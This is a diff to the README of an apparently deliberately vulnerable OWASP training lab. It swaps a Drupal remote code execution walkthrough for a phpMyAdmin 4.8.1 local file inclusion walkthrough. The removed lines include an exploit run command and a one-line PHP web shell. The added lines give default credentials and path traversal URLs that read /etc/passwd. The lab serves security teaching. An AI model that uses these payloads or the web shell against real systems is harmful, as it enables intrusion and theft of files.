@@ -1,10 +1,10 @@
 # Admin PHP
 
 <p align="center">
-    <img src="images/attack-1.png"/>
+    <img src="images/attack1.png"/>
 </p>
 
-Admin PHP is a simple web application built with Drupal that contains an example of a component with a known vulnerability and its main goal is to demonstrate how an attacker could exploit it.
+Admin PHP is a simple phpMyAdmin page that contains an example of a component with a known vulnerability and its main goal is to demonstrate how an attacker could exploit it.
 
 ## Index
 
@@ -26,7 +26,7 @@ The main goal of this app is to discuss how **Using Components With Known Vulner
 To start this intentionally **insecure application**, you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install]. After forking [b3d3cLabs](https://github.com/b3d3c/b3d3cLabs), you must type the following commands to start:
 
 ```sh
-cd b3d3cLabs/owasp-top10-2017/a9/Admin PHP
+cd b3d3cLabs/owasp-top10-2017/a9/admin-php
 ```
 
 ```sh
@@ -47,66 +47,30 @@ Now that you know the purpose of this app, what could go wrong? The following se
 
 ### 👀
 
-#### Use of a vulnerable Drupal version allows for remote code execution
+#### Use of a vulnerable phpMyAdmin version allows for local file inclusion
 
 
 It's possible to reach the server's web application from the standard HTTP port 80, as shown by the image below:
 
 <img src="images/attack-1.png" align="center"/>
 
-Afterward, by having a look at the `/robots.txt` file, it's possible to find the `CHANGELOG.txt` file in the `Disallow` field, as depicted by the image below:
+Afterward, by using `root` username and `toor` password, it is possible to authenticate on phpMyAdmin web page. As depicted by the image below, phpMyAdmin version is outdated:
 
 <img src="images/attack2.png" align="center"/>
 
-When accessed, an indication of the version of the Content Management System (Drupal) can be found, as shown below:
+Having the phpMyAdmin version, it's possible to check on [exploit-db][3] if there are any exploits associated with that version, in this case, phpMyAdmin 4.8.1. The results of the search are depicted in the image below:
 
 <img src="images/attack3.png" align="center"/>
 
-Having the CMS version, it's possible to check on [exploit-db][3] if there are any exploits associated with that version, in this case, Drupal 7.57. The results of the search are depicted in the image below:
+At the end of the document, you will find the Payload to exploit Linux systems.
 
 <img src="images/attack4.png" align="center"/>
 
-By using [searchsploit](https://www.exploit-db.com/searchsploit), an attacker could also find this same result via a terminal. To install it, simply type the following in your OSX terminal (keep in mind it might trigger your anti-virus software) :
-
-```sh
-⚠️ 'The next command will install several exploit codes in your system and many of them may trigger antiviruses alerts'
-
-brew install exploitdb
-```
-
-Then simply search for the version of the CMS found:
-
-```sh
-searchsploit drupal 7.
-```
-
-If you are using OSX, this command will help you to copy the exploit to your `/tmp` folder:
-
-```
-cp /usr/local/opt/exploitdb/share/exploit-database/exploits/php/webapps/44449.rb /tmp
-```
-
-## 🔥
-
-Running the malicious Ruby code, we have evidence that remote code execution is possible on the web server, using the following commands as shown below:
-
-```sh
-ruby /tmp/44449.rb http://localhost
-```
+First, an attacker would try to access to `http://localhost/index.php?a=phpinfo();&target=db_sql.php%253f/../../../../../../` to check if the system is vulnerable or verifies the input we provide, as shown by the image below:
 
 <img src="images/attack5.png" align="center"/>
 
-**NOTE**: You need to have Ruby installed on your system to run the exploit, for information on how to install it, click [here][1]!
-
-**NOTE 2**: If you came across an execution error when trying to run the exploit, please have a look at this [Issue][4] for information on how to proceed.
-
-The exploit works by adding into the server a malicious `s.php`, which allows remote code execution on it via following malicious content: 
-
-```php
-<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
-```
-
-Using the exploit's "fake shell", we can type a command, such as `whoami`, to verify that we indeed have an RCE on the server, as shown by the image:
+Finally, by including the full path to the file you want to access, you get its output. For example, obtaining the output of `/etc/passwd` by accessing to `http://localhost/index.php?a=phpinfo();&target=db_sql.php%253f/../../../../../../etc/passwd`, as shown by the image below:
 
 <img src="images/attack6.png" align="center"/>
 
@@ -114,12 +78,11 @@ Using the exploit's "fake shell", we can type a command, such as `whoami`, to ve
 
 How would you mitigate this vulnerability? After your changes, an attacker should not be able to:
 
-* Execute code remotely through the exploit above
+* Access Linux local files
 
 ## References
 
 * Docker Install:  https://docs.docker.com/install/
 * Docker Compose Install: https://docs.docker.com/compose/install/
 * App: http://localhost:80
-* 1: https://www.ruby-lang.org/en/documentation/installation/
-* 3: https://www.exploit-db.com/
+* Exploit-DB: https://www.exploit-db.com/
